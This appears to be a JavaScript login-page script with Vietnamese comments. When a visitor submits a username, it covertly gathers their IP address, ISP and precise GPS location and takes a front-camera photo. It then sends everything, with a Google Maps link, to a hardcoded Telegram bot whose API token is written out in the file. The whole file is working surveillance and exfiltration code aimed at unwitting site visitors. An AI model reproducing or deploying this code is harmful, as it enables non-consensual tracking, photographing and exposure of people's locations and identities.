const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1003770043455';
const TELEGRAM_CHAT_ID_NO_PHOTOS = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: '', // Sẽ lấy thời gian chính xác lúc bấm nút
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  lat: '',
  lon: '',
  camera: '⏳ Đang kiểm tra...',
  loginDetails: '',
  specialNote: '' 
};

// --- CÁC HÀM LẤY DỮ LIỆU (ĐÃ LƯỢC BỎ DEVICE/OS) ---

async function getPublicIP() {
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const data = await r.json();
    info.ip = data.ip || 'Không rõ';
  } catch (e) { info.ip = 'Bị chặn'; }
}

async function getRealIP() {
  try {
    const r = await fetch('https://icanhazip.com');
    const ip = await r.text();
    info.realIp = ip.trim();
    const res = await fetch(`https://ipwho.is/${info.realIp}`);
    const data = await res.json();
    info.isp = data.connection?.org || 'ISP';
  } catch (e) { info.realIp = 'Lỗi'; }
}

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);
        info.address = `📍 Tọa độ GPS: ${info.lat}, ${info.lon}`;
        resolve();
      },
      async () => { await fallbackIPLocation(); resolve(); },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

async function fallbackIPLocation() {
  try {
    const data = await fetch(`https://ipwho.is/`).then(r => r.json());
    info.lat = data.latitude?.toFixed(6) || '0';
    info.lon = data.longitude?.toFixed(6) || '0';
    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
  } catch (e) { info.address = 'Không rõ'; }
}

async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { throw e; }
}

// --- HÀM TẠO NỘI DUNG TIN NHẮN (KHÔNG LẤY THIẾT BỊ) ---
function getCaption() {
  const mapsLink = info.lat && info.lon
    ? `https://www.google.com/maps?q=${info.lat},${info.lon}`
    : 'Không rõ';

  const header = info.specialNote ? `${info.specialNote}\n` : '👤 [NGƯỜI DÙNG ĐĂNG NHẬP]';

  return `
${header}
━━━━━━━━━━━━━━━━━━
⏰ Thời gian: ${info.time}
👤 Tài khoản: ${info.loginDetails}
🌐 Địa chỉ IP: ${info.ip}
🏢 Nhà mạng: ${info.isp}
🏙️ Vị trí: ${info.address}
📍 Bản đồ: ${mapsLink}
📸 Camera: ${info.camera}
━━━━━━━━━━━━━━━━━━
`.trim();
}

async function sendPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
  
  const media = [];
  if (frontBlob) {
    media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
    formData.append('front', frontBlob, 'front.jpg');
  }
  if (backBlob) {
    media.push({ type: 'photo', media: 'attach://back' });
    formData.append('back', backBlob, 'back.jpg');
  }

  formData.append('media', JSON.stringify(media));
  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
}

async function sendTextOnly() {
  return fetch(API_SEND_TEXT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
      text: getCaption()
    })
  });
}

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

// --- HÀM CHÍNH ---
async function main() {
  // Cập nhật thời gian thực lúc bấm nút
  info.time = new Date().toLocaleString('vi-VN', { 
    hour: '2-digit', 
    minute: '2-digit', 
    second: '2-digit', 
    day: '2-digit', 
    month: '2-digit', 
    year: 'numeric' 
  });

  const user = document.getElementById('username').value.trim();
  const role = document.getElementById('user-role').value;
  info.loginDetails = `${user} (${role})`;

  // Nhận diện Admin
  if (user === "Mrwenben" || user === "VanThanh") {
      info.specialNote = `⚠️ Thông báo admin ${user} vừa đăng nhập vào trang`;
  } else {
      info.specialNote = ""; // Reset nếu là người dùng thường
  }

  await Promise.all([getPublicIP(), getRealIP(), getLocation()]);

  let front = null, back = null;

  try {
    front = await captureCamera("user");
    info.camera = '✅ Thành công';
  } catch (e) {
    info.camera = '🚫 Bị từ chối';
  }

  if (front) {
    await sendPhotos(front, null);
  } else {
    await sendTextOnly();
  }
  
  return true; 
}
